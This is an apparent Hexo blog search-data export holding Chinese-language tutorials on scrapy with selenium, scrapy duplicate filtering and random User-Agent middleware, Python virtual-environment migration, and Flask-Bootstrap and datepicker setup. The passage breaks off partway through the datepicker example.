</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;init.d&#x2F;polipo restart </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> polipo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scrapy 结合selenium对动态加载进行爬取</title>
      <link href="2020/04/15/2020-04-15-scrapy_selenium_crawl/"/>
      <url>2020/04/15/2020-04-15-scrapy_selenium_crawl/</url>
      
        <content type="html"><![CDATA[<h2 id="scrapy-结合selenium对动态加载进行爬取"><a href="#scrapy-结合selenium对动态加载进行爬取" class="headerlink" title="scrapy 结合selenium对动态加载进行爬取"></a>scrapy 结合selenium对动态加载进行爬取</h2><p>scrapy是个好工具，selenium也是一个好工具，但是两者一结合，就不那么好了。因为往一个非阻塞程序中塞入一段阻塞的代码，不能不令人抓狂。但即便如此，还是有不少需求需要在scrapy中使用selenium(往往是因为JavaScript搞不定)。可以利用github上的一个库scrapy-selenium。</p><h2 id="一、scrapy-selenium-请求类及中间件"><a href="#一、scrapy-selenium-请求类及中间件" class="headerlink" title="一、scrapy-selenium 请求类及中间件"></a>一、scrapy-selenium 请求类及中间件</h2><p>1.专属的<code>SeleniumRequest</code>类用来封装<code>selenium</code>的相关操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> Request</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SeleniumRequest</span>(<span class="params">Request</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, wait_time=<span class="literal">None</span>, wait_until=<span class="literal">None</span>, screenshot=<span class="literal">False</span>, script=<span class="literal">None</span>, *args, **kwargs</span>):</span></span><br><span class="line">      </span><br><span class="line">        self.wait_time = wait_time</span><br><span class="line">        self.wait_until = wait_until</span><br><span class="line">        self.screenshot = screenshot</span><br><span class="line">        self.script = script</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>().__init__(*args, **kwargs)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>继承自Scrapy.Reuqest，</p><p>wait_time: 等待时间<br>wait_until: 浏览器等待到我们想要的条件加载出来为止<br>screenshot: 用来截图，如果True，当前页面截图会在response “meta”中返回<br>script:js脚本，用于在加载后执行该脚本</p><p>2.下载中间件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> importlib <span class="keyword">import</span> import_module</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> signals</span><br><span class="line"><span class="keyword">from</span> scrapy.exceptions <span class="keyword">import</span> NotConfigured</span><br><span class="line"><span class="keyword">from</span> scrapy.http <span class="keyword">import</span> HtmlResponse</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .http <span class="keyword">import</span> SeleniumRequest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SeleniumMiddleware</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, driver_name, driver_executable_path, driver_arguments,</span></span></span><br><span class="line"><span class="function"><span class="params">        browser_executable_path</span>):</span></span><br><span class="line">        <span class="comment"># 初始化selenium webdriver</span></span><br><span class="line">       </span><br><span class="line">        webdriver_base_path = <span class="string">f&#x27;selenium.webdriver.<span class="subst">&#123;driver_name&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">        driver_klass_module = import_module(<span class="string">f&#x27;<span class="subst">&#123;webdriver_base_path&#125;</span>.webdriver&#x27;</span>)</span><br><span class="line">        driver_klass = <span class="built_in">getattr</span>(driver_klass_module, <span class="string">&#x27;WebDriver&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        driver_options_module = import_module(<span class="string">f&#x27;<span class="subst">&#123;webdriver_base_path&#125;</span>.options&#x27;</span>)</span><br><span class="line">        driver_options_klass = <span class="built_in">getattr</span>(driver_options_module, <span class="string">&#x27;Options&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        driver_options = driver_options_klass()</span><br><span class="line">        <span class="keyword">if</span> browser_executable_path:</span><br><span class="line">            driver_options.binary_location = browser_executable_path</span><br><span class="line">        <span class="keyword">for</span> argument <span class="keyword">in</span> driver_arguments:</span><br><span class="line">            driver_options.add_argument(argument)</span><br><span class="line"></span><br><span class="line">        driver_kwargs = &#123;</span><br><span class="line">            <span class="string">&#x27;executable_path&#x27;</span>: driver_executable_path,</span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;driver_name&#125;</span>_options&#x27;</span>: driver_options</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        self.driver = driver_klass(**driver_kwargs)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_crawler</span>(<span class="params">cls, crawler</span>):</span></span><br><span class="line">        <span class="comment"># 通过爬虫设置初始化中间件，读取Webdriver的启动路径和其它设置信息</span></span><br><span class="line">        </span><br><span class="line">        driver_name = crawler.settings.get(<span class="string">&#x27;SELENIUM_DRIVER_NAME&#x27;</span>)</span><br><span class="line">        driver_executable_path = crawler.settings.get(<span class="string">&#x27;SELENIUM_DRIVER_EXECUTABLE_PATH&#x27;</span>)</span><br><span class="line">        browser_executable_path = crawler.settings.get(<span class="string">&#x27;SELENIUM_BROWSER_EXECUTABLE_PATH&#x27;</span>)</span><br><span class="line">        driver_arguments = crawler.settings.get(<span class="string">&#x27;SELENIUM_DRIVER_ARGUMENTS&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> driver_name <span class="keyword">or</span> <span class="keyword">not</span> driver_executable_path:</span><br><span class="line">            <span class="keyword">raise</span> NotConfigured(</span><br><span class="line">                <span class="string">&#x27;SELENIUM_DRIVER_NAME and SELENIUM_DRIVER_EXECUTABLE_PATH must be set&#x27;</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        middleware = cls(</span><br><span class="line">            driver_name=driver_name,</span><br><span class="line">            driver_executable_path=driver_executable_path,</span><br><span class="line">            driver_arguments=driver_arguments,</span><br><span class="line">            browser_executable_path=browser_executable_path</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        crawler.signals.connect(middleware.spider_closed, signals.spider_closed)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> middleware</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_request</span>(<span class="params">self, request, spider</span>):</span></span><br><span class="line"><span class="comment"># 使用Selenium驱动程序处理请求</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(request, SeleniumRequest):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        self.driver.get(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> cookie_name, cookie_value <span class="keyword">in</span> request.cookies.items():</span><br><span class="line">            self.driver.add_cookie(</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&#x27;name&#x27;</span>: cookie_name,</span><br><span class="line">                    <span class="string">&#x27;value&#x27;</span>: cookie_value</span><br><span class="line">                &#125;</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> request.wait_until:</span><br><span class="line">            WebDriverWait(self.driver, request.wait_time).until(</span><br><span class="line">                request.wait_until</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> request.screenshot:</span><br><span class="line">            request.meta[<span class="string">&#x27;screenshot&#x27;</span>] = self.driver.get_screenshot_as_png()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> request.script:</span><br><span class="line">            self.driver.execute_script(request.script)</span><br><span class="line"></span><br><span class="line">        body = <span class="built_in">str</span>.encode(self.driver.page_source)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Expose the driver via the &quot;meta&quot; attribute</span></span><br><span class="line">        request.meta.update(&#123;<span class="string">&#x27;driver&#x27;</span>: self.driver&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> HtmlResponse(</span><br><span class="line">            self.driver.current_url,</span><br><span class="line">            body=body,</span><br><span class="line">            encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">            request=request</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spider_closed</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="comment"># 当爬虫关闭时关闭driver</span></span><br><span class="line">        </span><br><span class="line">        self.driver.quit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>github传送门：<a href="https://github.com/clemfromspace/scrapy-selenium">https://github.com/clemfromspace/scrapy-selenium</a></p><h2 id="二、安装及使用"><a href="#二、安装及使用" class="headerlink" title="二、安装及使用"></a>二、安装及使用</h2><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install scrapy-selenium</span><br></pre></td></tr></table></figure><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>在配置文件settings.py中配置driver名称、路径、传递设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from shutil import which</span><br><span class="line"></span><br><span class="line">SELENIUM_DRIVER_NAME &#x3D; &#39;firefox&#39;</span><br><span class="line">SELENIUM_DRIVER_EXECUTABLE_PATH &#x3D; which(&#39;geckodriver&#39;)</span><br><span class="line">SELENIUM_DRIVER_ARGUMENTS&#x3D;[&#39;-headless&#39;]  # &#39;--headless&#39; if using chrome instead of firefox</span><br></pre></td></tr></table></figure><p>将SeleniumMiddleware 添加到下载器中间件downloader middlewares:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DOWNLOADER_MIDDLEWARES &#x3D; &#123;</span><br><span class="line">    &#39;scrapy_selenium.SeleniumMiddleware&#39;: 800</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>使用scrapy_selenium.SeleniumRequest代替如下所示的scrapy内置请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from scrapy_selenium import SeleniumRequest</span><br><span class="line"></span><br><span class="line">yield SeleniumRequest(url&#x3D;url, callback&#x3D;self.parse_result)</span><br></pre></td></tr></table></figure><p>该请求将由selenium处理，并且该请求将具有一个附加的键值meta，名为driver，其中包含已处理请求的selenium驱动程序。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def parse_result(self, response):</span><br><span class="line">    title &#x3D; response.request.meta[&#39;driver&#39;].title</span><br><span class="line">    cookies &#x3D; response.request.meta[&#39;driver&#39;].get_cookies()</span><br></pre></td></tr></table></figure><p>选择器响应属性和scrapy相同，但包含了由selenium驱动程序处理的html）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def parse_result(self, response):</span><br><span class="line">    print(response.selector.xpath(&#39;&#x2F;&#x2F;title&#x2F;@text&#39;))</span><br></pre></td></tr></table></figure><h4 id="其他参数使用示例"><a href="#其他参数使用示例" class="headerlink" title="其他参数使用示例"></a>其他参数使用示例</h4><p><strong>wait_time/ wait_until</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from selenium.webdriver.common.by import By</span><br><span class="line">from selenium.webdriver.support import expected_conditions as EC</span><br><span class="line"></span><br><span class="line">yield SeleniumRequest(</span><br><span class="line">    url&#x3D;url,</span><br><span class="line">    callback&#x3D;self.parse_result,</span><br><span class="line">    wait_time&#x3D;10,</span><br><span class="line">    wait_until&#x3D;EC.element_to_be_clickable((By.ID, &#39;someid&#39;))</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><strong>screenshot</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yield SeleniumRequest(</span><br><span class="line">    url&#x3D;url,</span><br><span class="line">    callback&#x3D;self.parse_result,</span><br><span class="line">    screenshot&#x3D;True</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">def parse_result(self, response):</span><br><span class="line">    with open(&#39;image.png&#39;, &#39;wb&#39;) as image_file:</span><br><span class="line">        image_file.write(response.meta[&#39;screenshot&#39;])</span><br></pre></td></tr></table></figure><p><strong>script</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yield SeleniumRequest(</span><br><span class="line">    url&#x3D;url,</span><br><span class="line">    callback&#x3D;self.parse_result,</span><br><span class="line">    script&#x3D;&#39;window.scrollTo(0, document.body.scrollHeight);&#39;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> scrapy </tag>
            
            <tag> selenium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>下载python各个版本</title>
      <link href="2020/04/14/2020-04-14-download_python_all_releases/"/>
      <url>2020/04/14/2020-04-14-download_python_all_releases/</url>
      
        <content type="html"><![CDATA[<h2 id="下载python各个版本"><a href="#下载python各个版本" class="headerlink" title="下载python各个版本"></a>下载python各个版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.python.org&#x2F;ftp&#x2F;python</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scrapy 取消重复链接的过滤</title>
      <link href="2020/04/14/2020-04-14-scrapy_unfilter_duplicate_links/"/>
      <url>2020/04/14/2020-04-14-scrapy_unfilter_duplicate_links/</url>
      
        <content type="html"><![CDATA[<h2 id="scrapy-取消重复链接的过滤"><a href="#scrapy-取消重复链接的过滤" class="headerlink" title="scrapy 取消重复链接的过滤"></a>scrapy 取消重复链接的过滤</h2><p>[scrapy] DEBUG:Filtered duplicate request:<a href="GET:xxxx">GET:xxxx</a>-no more duplicates will be shown</p><p>不会显示更多重复项,其实这个的问题是,CrawlSpider结合LinkExtractor Rule,在提取链接与发链接的时候,出现了重复的连接、重复的请求,就会出现这个DEBUG。或者是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yield scrapy.Request(xxxurl,callback&#x3D;self.xxxx)</span><br></pre></td></tr></table></figure><p>中有重复的请求。scrapy自身是默认有过滤重复请求的，让这个DEBUG不出现,可以添加参数<strong>dont_filter=True</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yield scrapy.Request(xxxurl,callback&#x3D;self.xxxx,dont_filter&#x3D;True)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> scrapy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 虚拟环境迁移</title>
      <link href="2020/04/14/2020-04-14-python_venv_migration/"/>
      <url>2020/04/14/2020-04-14-python_venv_migration/</url>
      
        <content type="html"><![CDATA[<h2 id="python-虚拟环境迁移"><a href="#python-虚拟环境迁移" class="headerlink" title="python 虚拟环境迁移"></a>python 虚拟环境迁移</h2><p>1、生成依赖文件requireents.txt</p><p>在项目目录下新建一个whls文件夹(用来存储我们依赖包)，然后在虚拟环境cmd命令下切换到whls目录，执行以下命令将安装包版本信息导入到requireents.txt文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip freeze --all &gt; requirements.txt</span><br><span class="line">pip freeze &gt; requirements.txt</span><br></pre></td></tr></table></figure><p>注意–all参数，加上此参数会将setuptools、urllib3包进行打包；如果不加，这两个不会打包。</p><p>2、将包下载到whls目录下</p><p>whls目录下执行虚拟环境cmd命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip download -r requirements.txt --trusted-host mirrors.aliyun.com</span><br></pre></td></tr></table></figure><p>3、迁移到新的虚拟环境中，新建虚拟环境并激活</p><p>我使用的是虚拟环境包venv，指定虚拟环境的目录创建虚拟环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m venv 目录</span><br></pre></td></tr></table></figure><p>激活虚拟环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目录\Scripts\activate.bat</span><br></pre></td></tr></table></figure><p>4、安装全部依赖</p><p>如果直接使用网络下载：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>离线安装依赖包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --no-index --find-links&#x3D;. -r requirements.txt </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scrapy 随机更换UA</title>
      <link href="2020/04/13/2020-04-13-scrapy_random_change_useragent/"/>
      <url>2020/04/13/2020-04-13-scrapy_random_change_useragent/</url>
      
        <content type="html"><![CDATA[<p>编写中间件</p><p>(1)使用第三方user-agent库（fake-useragent）实现设置agent方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from fake_useragent import UserAgent</span><br><span class="line">&quot;&quot;&quot;设置随机UA&quot;&quot;&quot;</span><br><span class="line">class UseAgentMiddleware(object):</span><br><span class="line">    def __init__(self, user_agent&#x3D;&#39;&#39;):</span><br><span class="line">        self.ua &#x3D; UserAgent(verify_ssl&#x3D;False)</span><br><span class="line"></span><br><span class="line">    def process_request(self, request, spider):</span><br><span class="line">        if self.ua:</span><br><span class="line">            ua &#x3D; self.ua.random</span><br><span class="line">            # 显示当前使用的useragent</span><br><span class="line">            # print(&quot;*************Current UserAgent:%s***************&quot;%ua)</span><br><span class="line">            request.headers[&#39;User-Agent&#39;] &#x3D; ua</span><br></pre></td></tr></table></figure><p>(2)使用随机User-Agent方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">class UseAgentMiddleware(object):</span><br><span class="line">    def __init__(self, user_agent&#x3D;&#39;&#39;):</span><br><span class="line">        self.UserAgentList &#x3D; [</span><br><span class="line">     &quot;Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;,</span><br><span class="line">     &quot;Mozilla&#x2F;5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident&#x2F;4.0; WOW64; Trident&#x2F;4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)&quot;,</span><br><span class="line">     ]</span><br><span class="line"></span><br><span class="line">    def process_request(self, request, spider):</span><br><span class="line">        ua &#x3D; random.choice(self.UserAgentList)</span><br><span class="line">        # 显示当前使用的useragent</span><br><span class="line">        # print(&quot;*************Current UserAgent:%s***************&quot;%ua)</span><br><span class="line">        request.headers[&#39;User-Agent&#39;] &#x3D; ua</span><br></pre></td></tr></table></figure><p>在settings中取消默认UA，打开随机UA中间件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DOWNLOADER_MIDDLEWARES &#x3D; &#123;</span><br><span class="line">   &#39;xxxxx_spiders.middlewares.UseAgentMiddleware&#39;: 300,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> scrapy </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask-bootstrap离线加载</title>
      <link href="2020/04/12/2020-04-12-flask-bootstrap_offline_loading/"/>
      <url>2020/04/12/2020-04-12-flask-bootstrap_offline_loading/</url>
      
        <content type="html"><![CDATA[<h2 id="flask-bootstrap离线加载"><a href="#flask-bootstrap离线加载" class="headerlink" title="flask-bootstrap离线加载"></a>flask-bootstrap离线加载</h2><p>Flask-Bootstrap默认是加载CDN网站的css与js文件，如果想在断网环境使用它很不方便，取消加载CDN，加载本地资源。</p><p>法一：</p><p>我们可以通过简单的传入一个配置参数来使用本地的Bootstrap资源：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&#x27;BOOTSTRAP_SERVE_LOCAL&#x27;] = True</span><br></pre></td></tr></table></figure><p>法二：</p><p>找到python安装路径: Python\Lib\site-packages\flask_bootstrap\templates\bootstrap__init__.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 关闭CDN使用本地的静态文件</span><br><span class="line"># app.config.setdefault(&#39;BOOTSTRAP_SERVE_LOCAL&#39;, False)</span><br><span class="line">app.config.setdefault(&#39;BOOTSTRAP_SERVE_LOCAL&#39;,True)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask 日期控件datepicker使用</title>
      <link href="2020/04/11/2020-04-11-flask_date_control_datepicker/"/>
      <url>2020/04/11/2020-04-11-flask_date_control_datepicker/</url>
      
        <content type="html"><![CDATA[<h2 id="flask-日期控件datepicker使用"><a href="#flask-日期控件datepicker使用" class="headerlink" title="flask 日期控件datepicker使用"></a>flask 日期控件datepicker使用</h2><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">│  app.py</span><br><span class="line">├─static</span><br><span class="line">│  ├─css</span><br><span class="line">│  │      bootstrap-datepicker.standalone.min.css</span><br><span class="line">│  ├─js</span><br><span class="line">│  │      bootstrap-datepicker.min.js</span><br><span class="line">│  └─locales</span><br><span class="line">│          bootstrap-datepicker.zh-CN.min.js</span><br><span class="line">└─templates</span><br><span class="line">     └─index.html</span><br></pre></td></tr></table></figure><p>将需要的css/js放置在static目录下</p><h3 id="app-py"><a href="#app-py" class="headerlink" title="app.py"></a>app.py</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import render_template</span><br><span class="line">from flask_bootstrap import Bootstrap</span><br><span class="line">from flask import request</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__,static_url_path&#x3D;&#39;&#39;)</span><br><span class="line">app.config[&#39;BOOTSTRAP_SERVE_LOCAL&#39;]&#x3D;True</span><br><span class="line">app.config[&#39;SECRET_KEY&#39;] &#x3D; &#39;hard to guess string&#39;</span><br><span class="line">bootstrap &#x3D; Bootstrap(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def index():</span><br><span class="line">    start &#x3D; request.args.get(&#39;start&#39;)</span><br><span class="line">    end &#x3D; request.args.get(&#39;end&#39;)</span><br><span class="line">    return render_template(&#39;index.html&#39;,start&#x3D;start ,end &#x3D; end)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(host&#x3D;&#39;127.0.0.1&#39;,port&#x3D;&#39;5000&#39;,debug&#x3D;True)</span><br></pre></td></tr></table></figure><h3 id="index-html"><a href="#index-html" class="headerlink" title="index.html"></a>index.html</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 